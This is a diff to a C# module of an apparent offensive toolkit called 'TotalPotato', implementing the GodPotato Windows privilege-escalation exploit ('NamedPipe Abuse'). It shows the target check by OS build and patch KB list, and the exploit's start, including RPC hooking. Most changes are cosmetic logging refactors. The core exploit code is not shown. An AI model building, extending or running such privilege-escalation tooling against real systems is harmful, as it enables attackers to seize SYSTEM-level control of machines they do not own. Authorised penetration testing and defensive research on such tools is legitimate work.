@@ -1,7 +1,5 @@
 ﻿using SharpToken;
-using System.Diagnostics;
 using System.Management;
-using System.Net.Sockets;
 using System.Security.Principal;
 using TotalPotato.NativeAPI;
 namespace TotalPotato
@@ -11,23 +9,25 @@ namespace TotalPotato
         public string Name => "GodPotato";
         public string Description => "NamedPipe Abuse";
 
-
+        public void VerbosePrint(string message, ConsoleColor color = ConsoleColor.White)
+        {
+            Console.ForegroundColor = color;
+            Console.WriteLine(message);
+            Console.ResetColor();
+        }
 
         public bool IsApplicable()
         {
-            var osVersion = OSVersionHandler.GetOSVersion(); // Returns System.Version
-            int build = osVersion.Build;
+            var osVersion = OSVersionHandler.GetOSVersion(); int build = osVersion.Build;
             int major = osVersion.Major;
 
-            // GodPotato targets Win10 1809+ (Build 17763+) but fails on patched systems
             bool isWindows10OrLater = major >= 10;
             bool isSupportedBuild = build >= 17763 && build <= 22000;
 
-            // Known KBs that patch GodPotato (example set, you can expand this list)
             string[] patchKBs = new string[]
-            {
+{
         "KB5015807", "KB5016616", "KB5017380", "KB5021233", "KB5022282"
-            };
+};
 
             bool isPatched = false;
 
@@ -76,12 +76,13 @@ namespace TotalPotato
             TextWriter ConsoleWriter = Console.Out;
             try
             {
+                Console.WriteLine("[*] GodPotato exploit started...");
                 GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
 
-                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
-                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
-                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
-                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);
+                VerbosePrint($"[*] CombaseModule: 0x{godPotatoContext.CombaseModule:x}");
+                VerbosePrint($"[*] DispatchTable: 0x{godPotatoContext.DispatchTablePtr:x}");
+                VerbosePrint($"[*] UseProtseqFunction: 0x{godPotatoContext.UseProtseqFunctionPtr:x}");
+                VerbosePrint($"[*] UseProtseqFunctionParamCount: 0x{godPotatoContext.UseProtseqFunctionParamCount:x}");
 
                 ConsoleWriter.WriteLine("[*] HookRPC");
                 godPotatoContext.HookRPC();
